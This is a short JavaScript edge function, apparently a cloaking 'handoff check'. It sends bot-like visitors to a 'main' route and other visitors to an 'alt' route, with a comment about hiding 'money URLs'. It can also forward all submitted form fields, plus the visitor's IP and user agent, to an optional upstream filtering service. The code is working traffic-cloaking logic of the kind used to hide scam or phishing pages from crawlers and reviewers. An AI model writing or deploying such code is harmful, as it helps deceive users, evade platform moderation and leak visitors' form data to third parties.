/**
 * Handoff check — returns { route: "main"|"alt" } only. Never returns money URLs.
 * Optional CHECK_UPSTREAM: nav signal in body ⇒ alt.
 */
import { isBotLike } from "../_lib/bot.js";

export async function onRequestPost(context) {
  const { request, env } = context;
  const headers = {
    "content-type": "application/json; charset=utf-8",
    "cache-control": "no-store",
    "x-robots-tag": "noindex, nofollow",
  };

  const ua = request.headers.get("user-agent") || "";
  const form = await request.formData().catch(() => null);
  const payload = {};
  if (form) {
    for (const [k, v] of form.entries()) payload[k] = String(v);
  }

  const upstream = (env && env.CHECK_UPSTREAM) || "";
  if (upstream) {
    try {
      const body = new URLSearchParams(payload).toString();
      const res = await fetch(upstream, {
        method: "POST",
        headers: {
          "content-type": "application/x-www-form-urlencoded",
          "user-agent": ua,
          "x-forwarded-for": request.headers.get("cf-connecting-ip") || "",
        },
        body,
      });
      const text = await res.text();
      const route = /location\.(href|replace|assign)|window\.location/i.test(text)
        ? "alt"
        : "main";
      return new Response(JSON.stringify({ route, via: "upstream" }), { headers });
    } catch {
      return new Response(JSON.stringify({ route: "main", via: "upstream-error" }), {
        headers,
      });
    }
  }

  return new Response(
    JSON.stringify({ route: isBotLike(ua) ? "main" : "alt", via: "edge" }),
    { headers }
  );
}
